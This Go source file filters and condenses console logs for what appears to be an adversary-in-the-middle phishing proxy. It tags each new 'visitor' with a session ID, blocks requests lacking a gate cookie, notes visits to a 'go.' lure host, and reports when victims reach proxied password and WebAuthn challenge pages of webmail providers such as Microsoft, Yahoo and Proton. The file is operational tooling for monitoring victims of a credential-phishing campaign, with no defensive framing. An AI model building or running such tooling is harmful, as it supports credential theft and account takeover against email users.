package main

import (
	"bufio"
	"io"
	"log"
	"os"
	"strings"
	"sync"
	"time"
)

// consoleLogWriter keeps production console output intentionally small.
// Existing application logging calls remain untouched; this writer only
// controls what reaches stdout/PM2.
type consoleLogWriter struct {
	dst io.Writer
}

const (
	visitorLogDedupeWindow = 5 * time.Minute
	blockedLogDedupeWindow = 10 * time.Second
	stepLogDedupeWindow    = 2 * time.Minute
)

type visitorLogEntry struct {
	SID      string
	LastSeen time.Time
}

var compactConsoleState = struct {
	sync.Mutex
	pendingVerifyHost   string
	pendingVerifyPrefix string
	visitors            map[string]visitorLogEntry
	sidByIndex          map[string]string
	providerSeen        map[string]time.Time
	blockedSeen         map[string]time.Time
	stepSeen            map[string]time.Time
}{
	visitors:     make(map[string]visitorLogEntry),
	sidByIndex:   make(map[string]string),
	providerSeen: make(map[string]time.Time),
	blockedSeen:  make(map[string]time.Time),
	stepSeen:     make(map[string]time.Time),
}

func installCompactConsole() {
	originalStdout := os.Stdout

	reader, writer, err := os.Pipe()
	if err == nil {
		os.Stdout = writer
		go filterStdout(reader, originalStdout)
	}

	log.SetOutput(&consoleLogWriter{dst: originalStdout})
}

func (w *consoleLogWriter) Write(p []byte) (int, error) {
	line := strings.TrimRight(string(p), "\r\n")
	if out, ok := compactLogLine(line); ok {
		_, err := io.WriteString(w.dst, out+"\n")
		if err != nil {
			return 0, err
		}
	}
	return len(p), nil
}

func filterStdout(reader *os.File, dst io.Writer) {
	scanner := bufio.NewScanner(reader)
	buf := make([]byte, 0, 64*1024)
	scanner.Buffer(buf, 1024*1024)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		if strings.Contains(line, "New session:") {
			index := fieldBetween(line, "[+] [", "] New session:")
			rest := fieldAfter(line, "New session:")
			id := ""
			if fields := strings.Fields(rest); len(fields) > 0 {
				id = fields[0]
			}

			visitorKey := strings.TrimSpace(rest)
			if id != "" {
				visitorKey = strings.TrimSpace(strings.TrimPrefix(visitorKey, id))
			}

			now := time.Now()
			canonicalSID := id
			isNewVisitor := true
			verifyHost := ""
			verifyPrefix := ""

			compactConsoleState.Lock()

			for key, entry := range compactConsoleState.visitors {
				if now.Sub(entry.LastSeen) >= visitorLogDedupeWindow {
					delete(compactConsoleState.visitors, key)
				}
			}
			for key, lastSeen := range compactConsoleState.providerSeen {
				if now.Sub(lastSeen) >= visitorLogDedupeWindow {
					delete(compactConsoleState.providerSeen, key)
				}
			}
			for key, lastSeen := range compactConsoleState.blockedSeen {
				if now.Sub(lastSeen) >= blockedLogDedupeWindow {
					delete(compactConsoleState.blockedSeen, key)
				}
			}
			for key, lastSeen := range compactConsoleState.stepSeen {
				if now.Sub(lastSeen) >= stepLogDedupeWindow {
					delete(compactConsoleState.stepSeen, key)
				}
			}

			if visitorKey != "" {
				if existing, exists := compactConsoleState.visitors[visitorKey]; exists && now.Sub(existing.LastSeen) < visitorLogDedupeWindow {
					canonicalSID = existing.SID
					existing.LastSeen = now
					compactConsoleState.visitors[visitorKey] = existing
					isNewVisitor = false
				} else {
					compactConsoleState.visitors[visitorKey] = visitorLogEntry{SID: canonicalSID, LastSeen: now}
				}
			}

			if index != "" && canonicalSID != "" {
				compactConsoleState.sidByIndex[index] = canonicalSID
			}

			if isNewVisitor && compactConsoleState.pendingVerifyHost != "" {
				verifyHost = compactConsoleState.pendingVerifyHost
				verifyPrefix = compactConsoleState.pendingVerifyPrefix
				compactConsoleState.pendingVerifyHost = ""
				compactConsoleState.pendingVerifyPrefix = ""
			}

			compactConsoleState.Unlock()

			if !isNewVisitor {
				continue
			}

			if verifyHost != "" && canonicalSID != "" {
				if verifyPrefix == "" {
					verifyPrefix = now.Format("2006/01/02 15:04:05") + " "
				}
				_, _ = io.WriteString(dst, verifyPrefix+"🔐 VERIFY    •  SID "+canonicalSID+"  •  "+verifyHost+"\n")
			}

			out := now.Format("2006/01/02 15:04:05") + " 🟢 VISITOR   •  SID " + canonicalSID + "  •  New"
			_, _ = io.WriteString(dst, out+"\n")
			continue
		}

		upper := strings.ToUpper(line)
		if strings.Contains(upper, "[!] ") ||
			strings.Contains(upper, "[ERROR]") ||
			strings.Contains(upper, "ERROR:") ||
			strings.Contains(upper, "WARNING:") {
			_, _ = io.WriteString(dst, line+"\n")
		}
	}
}

func compactLogLine(line string) (string, bool) {
	lower := strings.ToLower(line)

	if strings.Contains(lower, "no gate cookie") {
		host := fieldBetween(line, "[→] [", "] no gate cookie")
		host = stripLogPort(host)
		if host == "" {
			host = "unverified request"
		}

		key := strings.ToLower(host) + "|no-gate-cookie"
		now := time.Now()

		compactConsoleState.Lock()
		if lastSeen, exists := compactConsoleState.blockedSeen[key]; exists && now.Sub(lastSeen) < blockedLogDedupeWindow {
			compactConsoleState.Unlock()
			return "", false
		}
		compactConsoleState.blockedSeen[key] = now
		compactConsoleState.Unlock()

		prefix := prefixBefore(line, "[→] [")
		return prefix + "🛑 BLOCKED   •  Unverified  •  " + providerDisplayName(host), true
	}

	if strings.Contains(line, "Request reached Go!") {
		host := fieldBetween(line, "Host: ", " | Path:")
		path := fieldBetween(line, "Path: ", " | Method:")
		method := strings.TrimSpace(fieldAfter(line, "Method: "))

		if method == "GET" && (path == "/" || path == "/index.html") {
			if strings.HasPrefix(strings.ToLower(host), "go.") {
				compactConsoleState.Lock()
				compactConsoleState.pendingVerifyHost = host
				compactConsoleState.pendingVerifyPrefix = prefixBefore(line, "[🔍 DEBUG]")
				compactConsoleState.Unlock()
			}
		}
		return "", false
	}

	if strings.Contains(line, "[>] [") {
		index, host, path, ok := indexedGET(line)
		if !ok {
			return "", false
		}

		prefix := prefixBefore(line, "[>] [")

		compactConsoleState.Lock()
		sid := compactConsoleState.sidByIndex[index]
		compactConsoleState.Unlock()

		if sid == "" {
			return "", false
		}

		// Log the next authentication screen reached after the user continues.
		// Query strings are not present in the existing request trace, so the
		// route path itself is the stable signal for these __eg_handoff pages.
		stepLabel := ""
		switch path {
		case "/account/challenge/password":
			stepLabel = "Password challenge"
		case "/account/challenge/web-authn":
			stepLabel = "WebAuthn challenge"
		}

		if stepLabel != "" {
			key := sid + "|" + path
			now := time.Now()

			compactConsoleState.Lock()
			if lastSeen, exists := compactConsoleState.stepSeen[key]; exists && now.Sub(lastSeen) < stepLogDedupeWindow {
				compactConsoleState.Unlock()
				return "", false
			}
			compactConsoleState.stepSeen[key] = now
			compactConsoleState.Unlock()

			return prefix + "➡️ STEP      •  SID " + sid + "  •  " + stepLabel, true
		}

		if path != "/" || strings.HasPrefix(strings.ToLower(host), "go.") {
			return "", false
		}

		provider := providerDisplayName(host)
		key := sid + "|" + provider
		now := time.Now()

		compactConsoleState.Lock()
		if lastSeen, exists := compactConsoleState.providerSeen[key]; exists && now.Sub(lastSeen) < visitorLogDedupeWindow {
			compactConsoleState.Unlock()
			return "", false
		}
		compactConsoleState.providerSeen[key] = now
		compactConsoleState.Unlock()

		return prefix + "📨 PROVIDER  •  SID " + sid + "  •  " + provider, true
	}

	if strings.Contains(line, "[⛔] BLOCKED:") || strings.Contains(line, "[x] BLOCKED:") {
		reason := strings.TrimSpace(fieldAfter(line, "BLOCKED:"))
		prefix := ""
		if strings.Contains(line, "[⛔] BLOCKED:") {
			prefix = prefixBefore(line, "[⛔] BLOCKED:")
		} else {
			prefix = prefixBefore(line, "[x] BLOCKED:")
		}
		if reason == "" {
			reason = "Request denied"
		}
		return prefix + "🛑 BLOCKED   •  " + reason, true
	}

	if strings.Contains(line, "Listening on ") ||
		strings.Contains(line, "Advanced correlation engine started") ||
		strings.Contains(line, "[config]") {
		return line, true
	}

	if strings.Contains(line, "[!] ") ||
		strings.Contains(lower, "error") ||
		strings.Contains(lower, "failed") ||
		strings.Contains(lower, "warning") {
		return line, true
	}

	return "", false
}

func indexedGET(line string) (string, string, string, bool) {
	marker := "[>] ["
	i := strings.Index(line, marker)
	if i < 0 {
		return "", "", "", false
	}

	rest := line[i+len(marker):]
	endIndex := strings.Index(rest, "]")
	if endIndex < 0 {
		return "", "", "", false
	}
	index := strings.TrimSpace(rest[:endIndex])
	rest = strings.TrimSpace(rest[endIndex+1:])

	if !strings.HasPrefix(rest, "[") {
		return "", "", "", false
	}
	endTarget := strings.Index(rest, "]")
	if endTarget < 0 {
		return "", "", "", false
	}
	rest = strings.TrimSpace(rest[endTarget+1:])

	if !strings.HasPrefix(rest, "GET ") {
		return "", "", "", false
	}
	rest = strings.TrimSpace(strings.TrimPrefix(rest, "GET "))
	fields := strings.Fields(rest)
	if len(fields) == 0 {
		return "", "", "", false
	}

	hostPath := fields[0]
	slash := strings.Index(hostPath, "/")
	if slash < 0 {
		return "", "", "", false
	}

	host := hostPath[:slash]
	path := hostPath[slash:]
	if q := strings.IndexByte(path, '?'); q >= 0 {
		path = path[:q]
	}

	return index, host, path, true
}

func prefixBefore(s, marker string) string {
	i := strings.Index(s, marker)
	if i <= 0 {
		return ""
	}
	return strings.TrimSpace(s[:i]) + " "
}

func stripLogPort(host string) string {
	host = strings.TrimSpace(host)
	if i := strings.LastIndex(host, ":"); i > 0 && !strings.Contains(host[i+1:], "]") {
		return host[:i]
	}
	return host
}

func providerDisplayName(host string) string {
	host = strings.ToLower(strings.TrimSpace(stripLogPort(host)))
	subdomain := host
	if i := strings.IndexByte(host, '.'); i >= 0 {
		subdomain = host[:i]
	}
	if i := strings.IndexByte(subdomain, '-'); i >= 0 {
		subdomain = subdomain[:i]
	}

	switch subdomain {
	case "yahoo":
		return "Yahoo"
	case "microsoft", "msa", "outlook", "office":
		return "Microsoft"
	case "turbify":
		return "Turbify"
	case "rackspace":
		return "Rackspace"
	case "zoho":
		return "Zoho"
	case "proton", "protonmail":
		return "Proton Mail"
	case "fastmail":
		return "Fastmail"
	case "tuta", "tutanota":
		return "Tuta"
	case "gmx":
		return "GMX"
	case "mailcom":
		return "Mail.com"
	case "yandex":
		return "Yandex"
	case "godaddy":
		return "GoDaddy"
	case "ionos":
		return "IONOS"
	case "namecheap":
		return "Namecheap"
	case "cpanel", "roundcube", "webmail", "custom":
		return "Webmail"
	}

	if subdomain == "" {
		return "Unknown"
	}
	return strings.ToUpper(subdomain[:1]) + subdomain[1:]
}

func fieldBetween(s, start, end string) string {
	i := strings.Index(s, start)
	if i < 0 {
		return ""
	}
	i += len(start)
	j := strings.Index(s[i:], end)
	if j < 0 {
		return strings.TrimSpace(s[i:])
	}
	return strings.TrimSpace(s[i : i+j])
}

func fieldAfter(s, start string) string {
	i := strings.Index(s, start)
	if i < 0 {
		return ""
	}
	return strings.TrimSpace(s[i+len(start):])
}
